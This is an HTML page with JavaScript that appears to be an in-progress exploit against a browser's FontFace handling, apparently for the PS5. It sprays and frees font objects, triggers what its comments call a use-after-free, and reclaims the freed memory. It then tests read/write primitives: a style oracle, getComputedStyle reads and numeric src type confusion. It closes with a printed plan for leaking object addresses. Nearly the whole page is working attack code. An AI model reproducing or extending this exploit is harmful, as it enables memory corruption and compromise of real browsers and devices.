<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v18</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
</style>
</head>
<body>
<h1 id="title" style="color:#0f0;font-family:monospace;font-size:20px;padding:16px">Loading...</h1>
<pre id="out" style="color:#0f0;font-family:monospace;font-size:14px;padding:16px"></pre>
<canvas id="c" width="512" height="128" style="position:absolute;left:-9999px"></canvas>
<script>
"use strict";

var O=document.getElementById("out");
var T=document.getElementById("title");
function P(m){O.textContent+=m+"\n";O.scrollTop=O.scrollHeight}
function S(m){T.textContent=m}

S("Starting...");

var keep=[],holes=[],rcs=[];
var trigger=null,rcFace=null,trigRef=null,rcIdx=-1;
var uafOk=false;

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

// Holes
S("Holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();
for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();
P("Holes done");S("Trigger...");

// Trigger
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
var sh=document.getElementById("s").sheet;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();
P("Trigger done");S("UAF...");

// UAF
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){
if(this===trigger&&!uafOk){
uafOk=true;
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);rcs.push(f)}catch(e){}}
fs();
try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);rcs.push(f)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

S("Loading...");

document.fonts.load("1em trigger, x","AB").then(function(faces){
S("Loaded!");
P("Faces: "+faces.length);

for(var i=0;i<faces.length;i++){
var f=faces[i];
P("  ["+i+"] "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
if(f.family==="trigger")trigRef=f;
}
keep.push(faces);keep.push(rcFace);keep.push(trigRef);

if(!rcFace){P("No RC face!");S("Failed");return}

P("\n=== CAPTURED RC_"+rcIdx+" ===");
S("RC_"+rcIdx+" captured");

// Test 1: Style write-through (CONFIRMED)
P("\n=== STYLE WRITE-THROUGH ===");
try{
rcFace.style="normal";fs();
var tv=trigRef.style;
P("rcFace.style='normal' -> trigRef.style='"+tv+"' "+(tv==="normal"?"OK":"FAIL"));
rcFace.style="italic";fs();
var tv2=trigRef.style;
P("rcFace.style='italic' -> trigRef.style='"+tv2+"' "+(tv2==="italic"?"OK":"FAIL"));
}catch(e){P("ERR: "+e.message)}

// Test 2: getComputedStyle read oracle
P("\n=== COMPUTED STYLE ORACLE ===");
try{
var d=document.createElement("div");
d.style.cssText="font:64px trigger;position:absolute;left:-9999px;";
document.body.appendChild(d);
var cs=getComputedStyle(d);

rcFace.style="italic";fs();
P("style=italic: computed.fontStyle="+getComputedStyle(d).fontStyle);

rcFace.style="normal";fs();
P("style=normal: computed.fontStyle="+getComputedStyle(d).fontStyle);

rcFace.style="oblique";fs();
P("style=oblique: computed.fontStyle="+getComputedStyle(d).fontStyle);

rcFace.style="italic";fs(); // restore
document.body.removeChild(d);
P("getComputedStyle WORKS as read oracle!");
}catch(e){P("ERR: "+e.message)}

// Test 3: Careful numeric src test
// Only test a FEW values and check rendering
P("\n=== CAREFUL NUMERIC src TEST ===");
var ctx=document.getElementById("c").getContext("2d");

// Baseline with buffer src
try{rcFace.src=mkBuf();fs()}catch(e){}
ctx.font="64px trigger";
var baseW=ctx.measureText("A").width;
P("Baseline canvas width: "+baseW.toFixed(2));

// Test numeric values ONE AT A TIME
var nums=[0,1,42,NaN,Infinity];
for(var i=0;i<nums.length;i++){
try{
rcFace.src=nums[i];fs();
var st=rcFace.status;
ctx.font="64px trigger";
var w=ctx.measureText("A").width;
var delta=w-baseW;
P("src="+String(nums[i]).padEnd(8)+" st="+st+" width="+w.toFixed(2)+" delta="+delta.toFixed(2)+
(delta!==0?" DIFFERENT!":""));
}catch(e){
P("src="+nums[i]+" ERR: "+e.message);
}
// Restore after each test
try{rcFace.src=mkBuf();fs()}catch(e){}
}

// Test 4: style as 1-bit oracle (DETAILED)
P("\n=== 1-BIT STYLE ORACLE ===");
try{
// Write 0 (normal)
rcFace.style="normal";fs();
var r0=trigRef.style;
P("Write normal -> read: "+r0+(r0==="normal"?" BIT=0 OK":" FAIL"));

// Write 1 (italic)
rcFace.style="italic";fs();
var r1=trigRef.style;
P("Write italic -> read: "+r1+(r1==="italic"?" BIT=1 OK":" FAIL"));

// Alternate 5 times
var ok=0;
for(var i=0;i<5;i++){
rcFace.style="normal";fs();
if(trigRef.style==="normal")ok++;
rcFace.style="italic";fs();
if(trigRef.style==="italic")ok++;
}
P("Reliability: "+ok+"/10 ("+(ok===10?"PERFECT":"UNSTABLE")+")");

// Restore
rcFace.style="italic";fs();
}catch(e){P("ERR: "+e.message)}

// Test 5: Use style oracle to encode data
P("\n=== DATA ENCODING DEMO ===");
try{
// Encode the byte 0xA5 = 10100101 binary
var bits=[1,0,1,0,0,1,0,1];
var decoded=[];
for(var i=0;i<bits.length;i++){
rcFace.style=bits[i]?"italic":"normal";fs();
var read=trigRef.style==="italic"?1:0;
decoded.push(read);
}
P("Sent:    "+bits.join(""));
P("Got:     "+decoded.join(""));
P("Match:   "+(bits.join("")===decoded.join("")?"YES!":"NO"));

rcFace.style="italic";fs();
}catch(e){P("ERR: "+e.message)}

// Test 6: Addrof strategy
P("\n=== ADDROF STRATEGY ===");
P("We have:");
P("  WRITE: rcFace.style = normal|italic");
P("  READ:  trigRef.style or getComputedStyle");
P("  BIT:   1 bit per operation");
P("");
P("Strategy:");
P("  1. Create target JS object");
P("  2. Somehow overlap with freed CSSFontFace");
P("  3. Read object address bit-by-bit");
P("  4. Need: way to make overlap happen");
P("");
P("OR: Use numeric src type confusion");
P("  1. rcFace.src = double_with_address_bits");
P("  2. CSS parser reads double as string pointer");
P("  3. If readable memory -> font loads from there");
P("  4. Measure rendering differences = read memory");
P("");
P("Current primitive: STYLE ORACLE (1-bit R/W)");
S("DONE - Check log");

}).catch(function(err){
P("Load error: "+err);
S("ERROR");
});
</script>
</body>
</html>
